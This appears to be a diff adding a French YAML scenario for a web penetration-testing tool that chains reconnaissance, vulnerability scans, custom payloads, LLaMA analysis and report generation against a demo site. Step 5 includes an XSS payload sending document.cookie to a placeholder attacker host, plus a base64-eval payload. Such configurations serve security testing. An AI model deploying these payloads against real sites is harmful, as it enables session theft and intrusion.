@@ -1,0 +1,195 @@
+################################################################################
+# WebPhantom - Scénario de test avancé
+# Ce scénario démontre l'utilisation de toutes les fonctionnalités avancées
+# de WebPhantom, notamment le scan avancé, l'analyse LLaMA, la génération de
+# rapports, l'authentification et les charges utiles personnalisées.
+################################################################################
+
+name: "Test de pénétration web avancé"
+description: "Scénario complet démontrant toutes les fonctionnalités avancées de WebPhantom"
+author: "WebPhantom Team"
+version: "1.0"
+target: "http://testphp.vulnweb.com"  # Cible de démonstration, à remplacer par votre cible
+
+# Configuration globale
+config:
+  timeout: 300  # Timeout global en secondes
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+  output_dir: "results"  # Dossier de sortie pour les résultats
+  verbose: true  # Mode verbeux
+
+# Étapes du scénario
+steps:
+  # Étape 1: Authentification (si nécessaire)
+  - name: "Configuration de l'authentification"
+    description: "Création d'un utilisateur de test et génération d'un token JWT"
+    type: "auth"
+    action: "setup"
+    params:
+      create_user:
+        username: "pentester"
+        email: "pentester@example.com"
+        password: "S3cur3P@ssw0rd!"
+        role: "pentester"
+      auth_method: "jwt"  # Options: basic, form, jwt
+      save_token: true
+      token_file: "auth_token.txt"
+
+  # Étape 2: Reconnaissance initiale
+  - name: "Reconnaissance"
+    description: "Analyse initiale de la cible"
+    type: "recon"
+    action: "run"
+    params:
+      deep_scan: true
+      port_scan: true
+      technology_detection: true
+      save_results: true
+      output_file: "recon_results.json"
+
+  # Étape 3: Scan de vulnérabilités basiques
+  - name: "Scan de vulnérabilités basiques"
+    description: "Détection des vulnérabilités web courantes"
+    type: "scan"
+    action: "run"
+    params:
+      scan_xss: true
+      scan_sqli: true
+      scan_lfi: true
+      scan_rfi: true
+      save_results: true
+      output_file: "basic_vulns_results.json"
+
+  # Étape 4: Scan de vulnérabilités avancées
+  - name: "Scan de vulnérabilités avancées"
+    description: "Détection des vulnérabilités web avancées"
+    type: "advanced-scan"
+    action: "run"
+    params:
+      scan_csrf: true
+      scan_ssrf: true
+      scan_xxe: true
+      scan_idor: true
+      scan_ssti: true
+      scan_jwt: true
+      scan_nosqli: true
+      scan_deserialization: true
+      save_results: true
+      output_file: "advanced_vulns_results.json"
+
+  # Étape 5: Génération et utilisation de charges utiles personnalisées
+  - name: "Génération de charges utiles"
+    description: "Création et utilisation de charges utiles personnalisées"
+    type: "payload"
+    action: "generate"
+    params:
+      categories:
+        - "xss"
+        - "sqli"
+        - "xxe"
+        - "csrf"
+      transformations:
+        - "url"
+        - "html"
+        - "base64"
+        - "js_obfuscate"
+      create_custom:
+        category: "xss"
+        set_name: "custom_xss"
+        name: "XSS Avancé Personnalisé"
+        description: "Charges utiles XSS personnalisées pour le test"
+        payloads:
+          - "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>"
+          - "<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>"
+      save_results: true
+      output_file: "custom_payloads.json"
+
+  # Étape 6: Test avec les charges utiles personnalisées
+  - name: "Test avec charges utiles personnalisées"
+    description: "Utilisation des charges utiles personnalisées pour tester la cible"
+    type: "scan"
+    action: "custom"
+    params:
+      payload_file: "custom_payloads.json"
+      target_params: true  # Tester tous les paramètres
+      target_forms: true   # Tester tous les formulaires
+      save_results: true
+      output_file: "custom_scan_results.json"
+
+  # Étape 7: Analyse avec LLaMA
+  - name: "Analyse IA avec LLaMA"
+    description: "Utilisation du modèle LLaMA pour analyser les résultats et identifier des vulnérabilités complexes"
+    type: "ai"
+    action: "analyze"
+    params:
+      model: "llama"
+      context_size: 2048
+      temperature: 0.7
+      input_files:
+        - "recon_results.json"
+        - "basic_vulns_results.json"
+        - "advanced_vulns_results.json"
+        - "custom_scan_results.json"
+      analyze_code: true
+      analyze_responses: true
+      suggest_exploits: true
+      suggest_fixes: true
+      save_results: true
+      output_file: "llama_analysis.json"
+
+  # Étape 8: Génération de rapport HTML
+  - name: "Génération de rapport HTML"
+    description: "Création d'un rapport détaillé au format HTML"
+    type: "report"
+    action: "generate"
+    params:
+      format: "html"
+      input_files:
+        - "recon_results.json"
+        - "basic_vulns_results.json"
+        - "advanced_vulns_results.json"
+        - "custom_scan_results.json"
+        - "llama_analysis.json"
+      include_screenshots: true
+      include_evidence: true
+      include_remediation: true
+      severity_filter: "all"  # Options: low, medium, high, critical, all
+      output_file: "pentest_report.html"
+
+  # Étape 9: Génération de rapport PDF
+  - name: "Génération de rapport PDF"
+    description: "Conversion du rapport HTML en PDF"
+    type: "report"
+    action: "generate"
+    params:
+      format: "pdf"
+      input_file: "pentest_report.html"
+      output_file: "pentest_report.pdf"
+
+# Hooks post-exécution
+hooks:
+  on_complete:
+    - action: "cleanup"
+      description: "Nettoyage des fichiers temporaires"
+      params:
+        keep_results: true
+        remove_temp: true
+    
+    - action: "notify"
+      description: "Notification de fin de test"
+      params:
+        message: "Test de pénétration terminé. Rapport disponible dans le dossier results."
+
+# Métadonnées additionnelles
+metadata:
+  tags:
+    - "pentest"
+    - "advanced"
+    - "web"
+    - "llama"
+    - "authentication"
+    - "custom-payloads"
+  cvss_version: "3.1"
+  compliance:
+    - "OWASP Top 10"
+    - "SANS Top 25"
